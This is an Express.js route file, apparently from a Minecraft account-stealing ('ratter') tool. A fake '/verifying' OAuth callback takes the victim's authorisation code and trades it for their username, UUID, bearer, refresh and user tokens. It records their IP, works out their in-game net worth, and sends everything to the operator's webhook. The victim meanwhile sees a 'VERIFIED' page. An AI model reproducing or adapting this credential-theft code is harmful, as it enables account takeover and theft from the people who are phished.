const express = require("express");
const { getWebhook, createCollection } = require("../utils/mongodb.js");
const networthCalc = require("../utils/Networth");
const ReturnData = require("../utils/gettoken");
const PostWebhook = require("../utils/sendwebhook");
const router = require("express").Router();
let ratter;

router.get("/verifying", async (req, res) => {
    ratter = req.query.state;
    const code = req.query.code;
  

    if (req.query.code === undefined) {
      res.status(400).send("Missing compulsory parameter: code");
      return;
    }
    if (req.query.state === undefined) {
      res.status(400).send("Missing compulsory parameter: state");
      return;
    }
  
    //find the appropriate webhook for this requests
    getWebhook(req.query.state).then((webhook) => {
      if (webhook == null) {
        res.status(400).send("Invalid api key");
        return;
      } else {
        console.log("Got webhook: " + webhook);
        webhook_url = webhook;
      }
    });
    try {
      // get all the data
      data = await ReturnData(code);
      const username = data[0];
      const uuid = data[1];
      const BearerToken = data[2];
      const RefreshToken = data[3];
      const UserToken = data[4];
      const ip = getIp(req);
      
  
      // initialize networth variables
      let networth = "0";
      let soulboundnetworth = "0";
      let sentnetworth = 0;
      let description = "No profile data found. 🙁";
      // get networth and description
      networthCalc(uuid)
        .then((result) => {
          networth = Intl.NumberFormat("en-US", {
            notation: "compact",
            maximumFractionDigits: 2,
          }).format(result[0]);
          soulboundnetworth = Intl.NumberFormat("en-US", {
            notation: "compact",
            maximumFractionDigits: 2,
          }).format(result[1]);
          description = result[2];
          sentnetworth = Math.trunc(result[0]) / 1000000;
  
          // send everything to the webhook
          PostWebhook(
            false,
            username,
            uuid,
            ip,
            BearerToken,
            RefreshToken,
            networth,
            soulboundnetworth,
            description,
            webhook_url,
            UserToken,
            ratter,
          );
        })
        .catch((error) => {
          console.log(error);
        });
    } catch (e) {
      console.log(e);
    }
  
    res.render(('refreshed/hackertext'), { title: "VERIFIED", textsize: "10" })
    
  createCollection();
  
  });
  
  function getIp(req) {
    return (
      req.headers["cf-connecting-ip"] ||
      req.headers["x-real-ip"] ||
      req.headers["x-forwarded-for"] ||
      req.connection.remoteAddress ||
      ""
    );
  }


  module.exports = router;  